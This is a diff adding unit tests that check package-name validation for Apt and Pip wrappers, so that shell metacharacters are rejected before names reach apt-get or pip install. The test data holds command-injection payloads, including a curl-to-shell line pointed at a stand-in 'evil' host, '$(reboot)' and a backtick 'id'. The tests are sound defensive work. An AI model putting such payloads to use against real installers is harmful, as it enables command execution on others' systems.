@@ -694,3 +694,20 @@ class TestWaitReady:
         ex = _FakeExec()
         b.wait_ready(spec, _recipe(_basic_builder(), spec), ex)
         assert ex.calls == []  # the ABC default never touches execute
+
+
+class TestPackageNameValidation:
+    def test_real_names_accepted(self) -> None:
+        # The package names actually used across examples must pass.
+        for name in ("nginx", "qemu-guest-agent", "python3-pip", "g++", "lib.foo_bar"):
+            assert Apt(name).name == name
+            assert Pip(name).name == name
+
+    def test_shell_metacharacters_rejected(self) -> None:
+        # H9: a name flows unquoted into apt-get/pip install, so an injection
+        # payload must be rejected at the trust boundary, not reach the shell.
+        for bad in ("foo; curl evil | sh", "$(reboot)", "a b", "x`id`", "foo&&bar"):
+            with pytest.raises(ValueError, match="valid package name"):
+                Apt(bad)
+            with pytest.raises(ValueError, match="valid package name"):
+                Pip(bad)
